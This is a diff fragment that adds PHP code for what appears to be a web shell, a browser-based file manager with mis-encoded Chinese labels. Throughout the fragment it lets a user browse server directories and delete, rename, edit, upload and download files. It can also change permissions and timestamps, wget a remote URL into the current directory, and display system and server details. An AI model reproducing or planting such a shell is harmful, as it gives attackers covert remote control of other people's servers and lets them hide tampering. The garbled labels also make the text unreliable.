+echo '<input type="button" value="ĞÂ½¨ÎÄ¼ş" onclick="nf(\'edit\',\'test1.php\');" style="width:68px;"> ';
+echo '<input type="button" value="ĞÂ½¨Ä¿Â¼" onclick="txts(\'Ä¿Â¼Ãû\',\'newdir\',\'e\');" style="width:68px;"> ';
+echo '<input type="button" value="WGET" onclick="txts(\'WGETµ½µ±Ç°Ä¿Â¼\',\'http://www.AA.com/B\',\'f\');" style="width:68px;"> ';
+//echo '<input type="button" value="ÅúÁ¿ÉÏ´«" onclick="go(\'upfiles\',\''.$nowdir.'\');" style="width:68px;"> ';
+echo '<form name="upfrm" id="upfrm" method="POST" enctype="multipart/form-data">';
+echo '<input type="hidden" name="rsv_t" id="rsv_t" value="'.$nowdir.'">';
+echo '<input type="file" name="upfile" style="width:286px;height:21px;"> ';
+echo '<input type="button" onclick="$(\'upfrm\').submit();" value="ÉÏ´«" style="width:50px;"> ';
+echo 'ÉÏ´«ÖØÃüÃûÎª <input type="text" name="rename" style="width:128px;">';
+echo '</form></div>';
+echo '<form name="frm1" id="frm1" method="POST"><table class="tables">';
+echo '<input type="hidden" name="rsv_t" id="rsv_t" value="'.$nowdir.'">';
+echo '<input type="hidden" name="act" id="act" value="">';
+echo '<input type="hidden" name="var" id="var" value="">';
+echo '<th><a href="javascript:cd(\''.dirname($nowdir).'/\');">ÉÏ¼¶Ä¿Â¼</a></th><th style="width:8%">²Ù×÷</th><th style="width:5%">ÊôĞÔ</th><th style="width:17%">´´½¨Ê±¼ä</th><th style="width:17%">ĞŞ¸ÄÊ±¼ä</th><th style="width:8%">ÏÂÔØ</th>';
+if($array) {
+	asort($array['dir']);
+	asort($array['file']);
+	$dnum = $fnum = 0;
+	foreach($array['dir'] as $path => $name) {
+		$prem = substr(decoct(fileperms($path)),-4);
+		$ctime = date('Y-m-d H:i:s',filectime($path));
+		$mtime = date('Y-m-d H:i:s',filemtime($path));
+		echo '<tr>';
+		echo '<td><a href="javascript:cd(\''.$nowdir.$name.'\');"><b>'.strtr($name,array('%27' => '\'','%22' => '"')).'</b></a></td>';
+		echo '<td><a href="javascript:dels(\''.$name.'\');">É¾</a> ';
+		echo '<a href="javascript:acts(\''.$name.'\',\'rf\',\''.$name.'\');">ÖØÃüÃû</a></td>';
+		echo '<td><a href="javascript:acts(\''.$prem.'\',\'pd\',\''.$name.'\');">'.$prem.'</a></td>';
+		echo '<td>'.$ctime.'</td>';
+		echo '<td>'.$mtime.'</td>';
+		echo '<td>-</td>';
+		echo '</tr>';
+		$dnum++;
+	}
+	foreach($array['file'] as $path => $name) {
+		$prem = substr(decoct(fileperms($path)),-4);
+		$ctime = date('Y-m-d H:i:s',filectime($path));
+		$mtime = date('Y-m-d H:i:s',filemtime($path));
+		$size = size(filesize($path));
+		echo '<tr>';
+		echo '<td><input type="checkbox" name="files[]" value="'.$name.'"><a target="_blank" href="'.$thisurl.$name.'">'.strtr($name,array('%27' => '\'','%22' => '"')).'</a></td>';
+		echo '<td><a href="javascript:go(\'edit\',\''.$name.'\');">±à¼­</a> ';
+		echo '<a href="javascript:acts(\''.$name.'\',\'rf\',\''.$name.'\');">ÖØÃüÃû</a></td>';
+		echo '<td><a href="javascript:acts(\''.$prem.'\',\'pd\',\''.$name.'\');">'.$prem.'</a></td>';
+		echo '<td>'.$ctime.'</td>';
+		echo '<td>'.$mtime.'</td>';
+		echo '<td align="right"><a href="javascript:go(\'down\',\''.$name.'\');">'.$size.'</a></td>';
+		echo '</tr>';
+		$fnum++;
+	}
+}
+unset($array);
+echo '</table>';
+echo '<div class="actall" style="text-align:left;">';
+echo '<input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> ';
+echo '<input type="button" value="¸´ÖÆ" style="width:50px;" onclick=\'txts("¸´ÖÆÂ·¾¶","'.$nowdir.'","a");\'> ';
+echo '<input type="button" value="É¾" style="width:50px;" onclick=\'dels("b");\'> ';
+echo '<input type="button" value="ÊôĞÔ" style="width:50px;" onclick=\'txts("ÊôĞÔÖµ","0666","c");\'> ';
+echo '<input type="button" value="Ê±¼ä" style="width:50px;" onclick=\'txts("ĞŞ¸ÄÊ±¼ä","'.$mtime.'","d");\'> ';
+echo 'Ä¿Â¼['.$dnum.'] - ÎÄ¼ş['.$fnum.'] - ÊôĞÔ['.$chmod.']</div></form>';
+break;
+}
+
+?><div class="footag"><?php
+echo php_uname() . '<br>' . $_SERVER['SERVER_SOFTWARE'];
+?></div></div></div></body></html>
